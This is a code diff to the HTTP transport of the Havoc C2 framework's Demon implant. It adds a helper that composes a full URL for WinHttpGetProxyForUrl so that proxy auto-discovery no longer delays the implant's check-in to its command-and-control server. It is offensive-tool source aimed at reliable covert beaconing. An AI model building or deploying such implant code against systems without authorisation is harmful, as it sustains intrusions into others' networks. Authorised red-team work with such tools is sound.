@@ -88,6 +88,70 @@ VOID HttpJa3Randomize( VOID )
 }
 
 /*!
+ * Build a full http(s)://host[:port]/path URL for WinHttpGetProxyForUrl.
+ *
+ * MSDN expects a URL including the scheme for WinHttpGetProxyForUrl. Demon/Havoc
+ * historically passed only the relative URI segment (see HttpEndpoint inside
+ * HttpSend). Passing a bare path triggers long-running WPAD auto-detection on
+ * some Windows builds and can delay WinHttpSendRequest long enough that C2 check-in
+ * times out before any outbound SYN is visible on netstat.
+ */
+static LPWSTR HttpComposeUrlForProxyLookup(
+    WCHAR * Buf,
+    SIZE_T  CchBuf,
+    LPWSTR  RelativePath
+)
+{
+    PHOST_DATA H;
+    LPCWSTR    scheme;
+    INT        nw;
+
+    if ( ! Buf || CchBuf < 16 || ! RelativePath ) {
+        return RelativePath;
+    }
+
+    H = Instance->Config.Transport.Host;
+    if ( ! H || ! H->Host ) {
+        return RelativePath;
+    }
+
+    if ( ! Instance->Win32.swprintf_s ) {
+        return RelativePath;
+    }
+
+    scheme = Instance->Config.Transport.Secure ? L"https://" : L"http://";
+
+    /* IPv6 literals contain ':' — RFC 3986 requires brackets around the host. */
+    if ( WcsStr( H->Host, L":" ) != NULL ) {
+        nw = Instance->Win32.swprintf_s(
+            Buf,
+            CchBuf,
+            L"%ls[%ls]:%lu%ls",
+            scheme,
+            H->Host,
+            ( ULONG ) H->Port,
+            RelativePath
+        );
+    } else {
+        nw = Instance->Win32.swprintf_s(
+            Buf,
+            CchBuf,
+            L"%ls%ls:%lu%ls",
+            scheme,
+            H->Host,
+            ( ULONG ) H->Port,
+            RelativePath
+        );
+    }
+
+    if ( nw < 0 || ( SIZE_T ) nw >= CchBuf ) {
+        return RelativePath;
+    }
+
+    return Buf;
+}
+
+/*!
  * @brief
  *  send a http request
  *
@@ -297,6 +361,13 @@ BOOL HttpSend(
     } else if ( ! Instance->LookedForProxy ) {
         // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol
 
+        WCHAR  UrlForWinHttpProxy[ 1024 ];
+        LPWSTR ProxyUrlLookup = HttpComposeUrlForProxyLookup(
+            UrlForWinHttpProxy,
+            sizeof( UrlForWinHttpProxy ) / sizeof( UrlForWinHttpProxy[ 0 ] ),
+            HttpEndpoint
+        );
+
         /*
          * NOTE: We use WinHttpGetProxyForUrl as the first option because
          *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
@@ -311,7 +382,7 @@ BOOL HttpSend(
         AutoProxyOptions.dwReserved             = 0;
         AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
 
-        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
+        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
             if ( ProxyInfo.lpszProxy ) {
                 PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
             }
@@ -345,7 +416,7 @@ BOOL HttpSend(
 
                     PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
 
-                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
+                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
                         if ( ProxyInfo.lpszProxy ) {
                             PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                         }
